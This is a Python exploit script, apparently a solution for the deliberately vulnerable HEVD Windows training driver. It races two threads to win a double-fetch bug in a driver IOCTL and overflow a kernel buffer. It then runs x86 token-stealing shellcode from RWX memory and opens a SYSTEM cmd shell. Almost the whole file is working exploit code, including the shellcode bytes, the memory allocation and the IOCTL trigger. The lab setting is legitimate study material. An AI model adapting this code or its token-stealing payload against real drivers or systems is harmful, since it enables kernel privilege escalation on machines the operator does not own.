# -*- coding: utf-8 -*-
import struct
import ctypes
import threading
import os
from ctypes import *
from ctypes.wintypes import *


kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32


class DoubleFetchStruct(Structure):
    """Represent the DoubleFetch Struct"""
    _fields_ = [ 	
        ("Buffer", c_char_p),
	("Size", c_uint)	
    ]


def debug_print(message):
    """ debug_debug_prints message in terminal and debugger """
    print(message)
    return kernel32.OutputDebugStringA(message + "\n")


def getLastError():
    """ Format GetLastError """
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), 0,
            buf, sizeof(buf), NULL):
        debug_print("\n[-] ERR:  " + str(buf.value))
    else:
        debug_print("Unknown Error")


def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG
    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """
    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))
    if len(data) == 0:
        return '<empty>'
    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16
        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])
        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '
        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c
        lines.append(line)
    return '\n'.join(lines)
    

def _ret_shellcode_buffer():
    """ Payload memory allocation in user-land """
    shellcode =  "\x90" * 0x100 # some padding to preventing some crashes
    shellcode += bytearray(
        #---[Debug]
        #"\xCC"
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad
        #--[Stack aligment]
        "\x5D"                          # pop ebp
        "\x5D"                          # pop ebp
        "\x5D"                          # pop ebp
        "\x5D"                          # pop ebp
        "\x5D"                          # pop ebp
        "\x31\xC0"                      # xor eax, eax (NT STATUS OK)
        "\xC3"                          # ret 8
    )
    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40
    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )
    return ptr, len(shellcode)


def _send_payload(payload_ptr, payload_len, code):
    """ Interacting with the driver """
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3
    # Recreate CTL_CODE macro to generate driver IOCTL 
    """
    ctl_code = hex(
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )
    """
    ctl_code = code # direct_input
    # Create handle to driver
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )
    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code,           # dwIoControlCode
        payload_ptr,        # lpInBuffer
        c_int(payload_len), # nInBufferSize
        None,               # lpOutBuffer
        0,                  # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    return kernel32.CloseHandle(handle)


ubuffer = DoubleFetchStruct() # input buffer Struct 

def thread_race():
    """Thread Race Condition -> change struct value continuous"""
    for i in range(0xffff):
        ubuffer.Size = 0x838 # 0x838 EIP control 0x41414141 -> shellcode_ptr
        ubuffer.Size = 0x800


def main_thread(shellcode_ptr):
    """Main Thread -> Send IOCTL continuous connection with modified struct"""
    for i in range(0xffff):
        # send payload
        ubuffer.Buffer = addressof(
            create_string_buffer(
                "A" * 0x834 +
                struct.pack("<L", shellcode_ptr) # * 526  # 0x838 / 4 (EIP OVERFLOW)
        ))
        _send_payload(addressof(ubuffer), 0x834, code)


def _exploit(code):
    """
    This vulnerability occurs when a struct parameter is verified, 
    then [memcpy] this value to a buffer.
    
    The biggest problem is that if an user set threading to change this struct value, 
    it can be possible to bypass this check and trigger buffer overflow through [memcpy] call.
    ------------------------------------------------------------------------------------------
    
    Vulnerable piece of code:
    [...]
    if (UBUFFER_PTR[1] < (void *)0x801) {
        DbgPrintEx(0x4d,3,"[+] Triggering Double Fetch\n");
                        /* SIMPLE BOF */
        memcpy(KBUFFER,UBUFFER,(size_t)UBUFFER_PTR[1]);
    }
    """

    shellcode_ptr, shellcode_len = _ret_shellcode_buffer() # shellcode virtual allocation
    debug_print("\n[*] User-land shellcode allocated at: [0x%x]\n" % shellcode_ptr)
    debug_print(hexdump(shellcode_ptr, 32))

    debug_print("[*] Starting Vulnerability Thread RACE")        
    t1 = threading.Thread(target=thread_race, args=())
    t1.start()
    
    debug_print("[*] Starting Main Thread")        
    t2 = threading.Thread(target=main_thread, args=(shellcode_ptr,))
    t2.start()
    
    debug_print("[+] Waiting for Double Fetch to trigger ...")	
    t1.join()
    t2.join()
    
    debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
    os.system("cmd.exe /K")
    
if __name__ == "__main__":
    """
    References:
        https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win7%20x86/HEVD_doublefetch.py
        https://resources.infosecinstitute.com/topic/exploiting-windows-drivers-double-fetch-race-condition-vulnerability/

    .sympath srv*c:\Symbols*http://msdl.microsoft.com/download/symbols;C:\HEVD
    .reload /f *.*
    ed nt!Kd_Default_Mask 0xf
    bp HEVD+0x45de6
    g
    """
    code = 0x222037 # DoubleFetch IOCTL
    _exploit(code)
